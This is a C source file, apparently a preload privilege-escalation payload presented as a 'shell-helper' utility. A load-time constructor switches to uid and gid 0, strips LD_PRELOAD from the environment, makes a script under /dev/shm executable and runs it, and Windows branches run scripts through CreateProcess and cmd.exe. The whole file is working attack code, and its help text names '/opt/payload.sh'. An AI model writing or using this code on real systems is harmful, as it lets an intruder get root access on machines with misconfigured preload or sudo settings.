#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>

#ifdef _WIN32
#include <windows.h>
#include <process.h>
#else
#include <unistd.h>
#endif

static void exec_helper_script(const char* script_path) {
    fprintf(stderr, "[+] Executing helper script: %s\n", script_path);

    struct stat st;
    if (stat(script_path, &st) != 0) {
        fprintf(stderr, "[-] Script not found: %s (%s)\n", script_path, strerror(errno));
        return;
    }

#ifdef _WIN32
    /* No +x semantics on Windows; rely on file association / extension. */
    fprintf(stderr, "[+] Spawning helper script\n");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    /* Use a mutable buffer — CreateProcess may write to the command line. */
    char cmdline[MAX_PATH];
    snprintf(cmdline, sizeof(cmdline), "\"%s\"", script_path);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        /* Fall back to running via cmd.exe /C so .bat/.cmd scripts work. */
        const char* comspec = getenv("COMSPEC");
        if (!comspec) comspec = "cmd.exe";
        char fallback[MAX_PATH * 2];
        snprintf(fallback, sizeof(fallback), "%s /C \"%s\"", comspec, script_path);
        if (!CreateProcessA(NULL, fallback, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            fprintf(stderr, "[-] CreateProcess failed (%lu)\n",
                    (unsigned long)GetLastError());
            return;
        }
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
#else
    if (!(st.st_mode & S_IXUSR)) {
        fprintf(stderr, "[!] Script not executable, attempting chmod +x\n");
        chmod(script_path, st.st_mode | S_IXUSR | S_IXGRP | S_IXOTH);
    }

    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");

    fprintf(stderr, "[+] Spawning helper script\n");

    unsetenv("LD_PRELOAD");

    execl(script_path, script_path, NULL);
    fprintf(stderr, "[-] Failed to execute script: %s\n", strerror(errno));
#endif
}

#ifndef _WIN32
__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_HELPER_ACTIVE")) return;
    if (getenv("SHELL_HELPER_MAIN")) return;

    setenv("SHELL_HELPER_ACTIVE", "1", 1);
    const char* script_path = getenv("HELPER_SCRIPT");
    if (!script_path) script_path = "/dev/shm/helper.sh";
    exec_helper_script(script_path);
}
#endif

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
#ifdef _WIN32
    _putenv("SHELL_HELPER_MAIN=1");
    _putenv("SHELL_HELPER_ACTIVE=1");
#else
    setenv("SHELL_HELPER_MAIN", "1", 1);
    setenv("SHELL_HELPER_ACTIVE", "1", 1);
#endif

    char *script_path = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("shell-helper - Execute helper script utility\n");
            printf("Usage: %s [options] [script_path]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -s <path>     Script path to execute\n");
            printf("\nExamples:\n");
            printf("  %s                         # Execute default helper\n", argv[0]);
            printf("  %s /tmp/script.sh          # Execute specific script\n", argv[0]);
            printf("  %s -s /opt/payload.sh      # Execute with -s option\n", argv[0]);
            printf("\nEnvironment:\n");
            printf("  HELPER_SCRIPT=<path>  Script path (fallback if no args)\n");
            return 0;
        } else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
            script_path = argv[++i];
        } else if (argv[i][0] != '-') {
            script_path = argv[i];
        }
    }

    if (!script_path) {
        script_path = getenv("HELPER_SCRIPT");
    }

    if (!script_path) {
#ifdef _WIN32
        script_path = "helper.bat";
#else
        script_path = "/dev/shm/helper.sh";
#endif
    }

    exec_helper_script(script_path);
    return 0;
}
#endif
